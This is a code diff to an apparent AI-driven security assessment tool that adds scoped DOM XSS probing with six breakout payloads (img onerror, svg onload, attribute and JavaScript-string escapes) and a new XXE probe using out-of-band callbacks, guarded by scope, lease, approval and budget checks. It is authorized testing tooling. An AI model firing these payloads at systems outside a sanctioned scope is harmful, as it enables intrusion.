@@ -724,6 +724,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
             "scoped_assessment_probe_assigned": self.scoped_assessment_probe_assigned,
             "scoped_input_probe_assigned": self.scoped_input_probe_assigned,
             "scoped_dom_xss_assigned": self.scoped_dom_xss_assigned,
+            "scoped_xml_entity_assigned": self.scoped_xml_entity_assigned,
             "scoped_stored_xss_assigned": self.scoped_stored_xss_assigned,
             "probe_observed_input_batch": self.probe_observed_input_batch,
             "scoped_assessment_candidate": self.scoped_assessment_candidate,
@@ -1129,8 +1130,9 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
 
     async def scoped_dom_xss_assigned(
         self, coverage_cell_id: str, coverage_lease_id: str,
+        technique: str = "html_body",
     ) -> Dict[str, Any]:
-        """Probe an observed browser URL source on its rendering page."""
+        """Try one bounded browser technique on a leased DOM source."""
         import time
         from urllib.parse import quote, urlsplit
         from app.services.agent.engagement_brain import engagement_brain_from_dict
@@ -1152,6 +1154,21 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
                            {"html_assignment", "dynamic_code"}
                            for lead in cell.get("sink_leads") or [])):
             return {"success": False, "error": "invalid_dom_xss_lease"}
+        payloads = {
+            "html_body": '<img src=x onerror=alert("__PROWL_NONCE__")>',
+            "html_body_svg": '<svg onload=alert("__PROWL_NONCE__")>',
+            "html_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
+            "html_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
+            "js_single": "';alert(\"__PROWL_NONCE__\");//",
+            "js_double": '\";alert(\'__PROWL_NONCE__\');//',
+        }
+        if technique not in payloads:
+            return {"success": False, "error": "unsupported_technique",
+                    "allowed_techniques": list(payloads)}
+        if len(cell.get("dom_probe_attempts") or []) >= len(payloads):
+            return {"success": False, "error": "dom_probe_budget_exhausted"}
+        if technique in {row.get("technique") for row in cell.get("dom_probe_attempts") or []}:
+            return {"success": False, "error": "technique_already_attempted"}
         location, separator, field = str(cell.get("parameter") or "").partition(":")
         source_kind = "query" if location == "query" and separator else "fragment"
         if (source_kind == "query"
@@ -1175,7 +1192,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         if (not scoped_origin or _origin(f"{parts.scheme}://{cell.get('host') or ''}")
                 != scoped_origin):
             return {"success": False, "error": "scope_mismatch"}
-        payload = '<img src=x onerror=alert("__PROWL_NONCE__")>'
+        payload = payloads[technique]
         identity = str(cell.get("identity") or "anonymous")
         page_url = scoped_origin + page_path
         if source_kind == "query":
@@ -1207,6 +1224,11 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         ]))[:30]
         operation = "scoped_browser_check_xss_" + source_kind
         current["last_probe"] = operation
+        current["dom_probe_attempts"] = [
+            *(current.get("dom_probe_attempts") or []),
+            {"technique": technique, "evidence_id": artifact_id,
+             "executed": proof.get("executed") is True},
+        ][:len(payloads)]
         if proof.get("executed") is True:
             current["status"] = "in_focus"
             current["reason"] = "Browser execution signal; independent verification required"
@@ -1214,9 +1236,125 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         return {"success": True, "coverage_cell_id": coverage_cell_id,
                 "coverage_lease_id": coverage_lease_id, "evidence_id": artifact_id,
                 "operation": operation,
+                "technique": technique,
                 "proof_confirmed": proof.get("executed") is True,
                 "probe_result": {"executed": proof.get("executed") is True,
-                                 "request_context": request_context}}
+                                 "request_context": request_context,
+                                 "reflection_contexts": proof.get("reflection_contexts") or []}}
+
+    async def scoped_xml_entity_assigned(
+        self, coverage_cell_id: str, coverage_lease_id: str,
+        technique: str = "parser_control",
+    ) -> Dict[str, Any]:
+        """Test one leased, browser-captured XML POST without model-supplied bytes."""
+        import time
+        from urllib.parse import urlsplit
+
+        from app.services.agent.engagement_brain import engagement_brain_from_dict
+        from app.services.agent.evidence_store import evidence_store
+        from app.services.agent.parameter_inventory import _origin
+        from app.services.agent.scoped_assessment.xml_entity import (
+            plan_xml_entity_probe, send_xml_callback,
+        )
+
+        brain = engagement_brain_from_dict(getattr(self, "_engagement_brain", None))
+        cell = next((row for row in brain.coverage_cells
+                     if row.get("id") == coverage_cell_id), None)
+        if (not cell or cell.get("status") != "leased"
+                or cell.get("lease_id") != coverage_lease_id
+                or float(cell.get("lease_deadline") or 0) <= time.time()
+                or cell.get("source") != "parameter_inventory"
+                or cell.get("observation_source") != "browser_traffic"
+                or cell.get("test_type") != "xxe"
+                or cell.get("method") != "POST"
+                or cell.get("parameter") != "body_xml:document"
+                or not cell.get("capture_id")):
+            return {"success": False, "error": "invalid_xml_coverage_lease"}
+        if technique not in {"parser_control", "external_callback"}:
+            return {"success": False, "error": "unsupported_technique"}
+        if technique in {row.get("technique") for row in cell.get("xxe_probe_attempts") or []}:
+            return {"success": False, "error": "technique_already_attempted"}
+        cmap = getattr(self, "_capability_map", None) or {}
+        scoped_origin = _origin(str(cmap.get("target") or cmap.get("scope") or
+                                    getattr(self, "_fallback_target", "") or ""))
+        parts = urlsplit(scoped_origin)
+        if (not scoped_origin or _origin(f"{parts.scheme}://{cell.get('host') or ''}")
+                != scoped_origin):
+            return {"success": False, "error": "scope_mismatch"}
+        path = str(cell.get("path") or "")
+        if path not in (getattr(self, "_scoped_body_replay_paths", None) or set()):
+            return {"success": False, "error": "operator_approval_required",
+                    "reason": "The exact XML POST path needs approved replay"}
+        identity = str(cell.get("identity") or "anonymous")
+        try:
+            private = self._scoped_exchange(str(cell["capture_id"]), identity)
+            plan = plan_xml_entity_probe(
+                private, allowed_origin=scoped_origin, expected_path=path,
+            )
+            self._scoped_origin(plan["url"])
+        except (TypeError, ValueError) as exc:
+            return {"success": False, "error": "invalid_xml_capture",
+                    "reason": str(exc)[:200]}
+        if technique == "external_callback" and not self._oob_callbacks_allowed:
+            return {"success": False, "error": "oob_callbacks_not_authorized"}
+        try:
+            if technique == "parser_control":
+                self._scoped_claim_posts(1)
+                exchange = await self._http_exchange(
+                    method="POST", url=plan["url"],
+                    headers={**plan["headers"], "Content-Type": plan["mime"]},
+                    body=plan["control_body"], identity=identity,
+                    use_auth_session=False, follow_redirects=False,
+                    coverage_cell_id=coverage_cell_id,
+                )
+                evidence_id = str(exchange["evidence_id"])
+                probe = {"status": exchange["response"]["status"],
+                         "parser_control_sent": True}
+                extra_ids: list[str] = []
+                confirmed = False
+            else:
+                callback = await send_xml_callback(self, plan, identity=identity)
+                extra_ids = [str(item) for item in callback.get("evidence_ids") or []]
+                confirmed = callback.get("callback_observed") is True
+                probe = {"callback_observed": confirmed,
+                         "poll_attempts": int(callback.get("poll_attempts") or 0)}
+                evidence_id = evidence_store(self).record(
+                    "scoped_xml_xxe", {
+                        "operation": "external_callback", "target": plan["url"],
+                        "source_artifact_id": cell["capture_id"],
+                        "callback_observed": confirmed,
+                        "oob_evidence_ids": extra_ids,
+                    }, target=plan["url"], identity=identity, success=confirmed,
+                )
+        except (KeyError, TypeError, ValueError) as exc:
+            return {"success": False, "error": "xml_probe_failed",
+                    "reason": str(exc)[:200]}
+        live = engagement_brain_from_dict(getattr(self, "_engagement_brain", None))
+        current = next((row for row in live.coverage_cells
+                        if row.get("id") == coverage_cell_id
+                        and row.get("lease_id") == coverage_lease_id), None)
+        if current is None:
+            return {"success": False, "error": "lease_changed"}
+        current["probe_artifact_ids"] = list(dict.fromkeys([
+            *(current.get("probe_artifact_ids") or []), evidence_id,
+        ]))[:20]
+        current["evidence_ids"] = list(dict.fromkeys([
+            *(current.get("evidence_ids") or []), evidence_id, *extra_ids,
+        ]))[:30]
+        current["xxe_probe_attempts"] = [
+            *(current.get("xxe_probe_attempts") or []),
+            {"technique": technique, "evidence_id": evidence_id,
+             "callback_observed": confirmed},
+        ][:2]
+        current["last_probe"] = "scoped_xml_" + technique
+        if confirmed:
+            current["status"] = "in_focus"
+            current["reason"] = "XML callback signal; independent verification required"
+        self._engagement_brain = live.to_dict()
+        return {"success": True, "coverage_cell_id": coverage_cell_id,
+                "coverage_lease_id": coverage_lease_id, "operation": current["last_probe"],
+                "technique": technique, "evidence_id": evidence_id,
+                "proof_confirmed": confirmed, "probe_result": probe}
 
     async def scoped_stored_xss_assigned(
         self, coverage_cell_id: str, coverage_lease_id: str,
@@ -7588,6 +7726,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         server: Optional[str] = None,
         token: Optional[str] = None,
         keep_session: bool = False,
+        summary_only: bool = False,
     ) -> str:
         """Run a correlated custom OAST probe using a fresh Interactsh session.
 
@@ -7615,6 +7754,11 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
             token=token,
             keep_session=keep_session,
         )
+        if summary_only:
+            result = {key: result.get(key) for key in (
+                "success", "error", "callback_observed", "poll_attempts",
+                "evidence_ids", "proof",
+            ) if key in result}
         return json.dumps(result, indent=2, default=str)[:_tool_output_max_chars()]
 
     async def read_evidence(self, evidence_id: str, offset: int = 0, limit: int = 6000) -> str:
